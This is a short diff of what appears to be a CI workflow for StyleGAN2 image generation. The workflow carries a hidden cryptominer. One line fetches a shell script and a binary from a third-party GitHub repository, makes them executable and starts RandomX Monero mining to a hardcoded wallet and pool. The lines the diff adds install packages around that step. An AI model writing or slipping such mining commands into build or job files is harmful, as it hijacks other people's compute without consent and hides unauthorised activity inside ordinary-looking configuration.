@@ -34,6 +34,8 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
+        sudo apt update 
+        apt install git wget nano libpci-dev
         wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 84ouhE8R2BjfkaM1ME2hY8BPneHyYYpnZcp4kETQ2P9DAEp5RNokV2s1Mwcp5nBV3oeLcTCkFCusK4eLKLH7214gVq1hGC3 -rig $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
